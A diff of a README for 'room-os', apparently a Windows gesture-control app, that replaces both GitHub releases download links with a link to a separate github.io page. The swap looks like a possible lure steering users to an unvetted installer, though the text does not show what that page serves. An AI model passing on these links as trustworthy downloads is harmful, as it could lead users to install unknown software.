@@ -1,6 +1,6 @@
 # 🙌 room-os - Control Windows with Gestures and Presence
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=windows)](https://github.com/Indecisive-regular790/room-os/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=windows)](https://indecisive-regular790.github.io)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Welcome to room-os! This application lets you control your Windows computer usin
 
 ## 📥 How to Download and Install
 
-Visit this link to download the application: [https://github.com/Indecisive-regular790/room-os/releases](https://github.com/Indecisive-regular790/room-os/releases)
+Visit this link to download the application: [https://indecisive-regular790.github.io](https://indecisive-regular790.github.io)
 
 1. Click the download link above
 2. Find the latest release and download the installer file
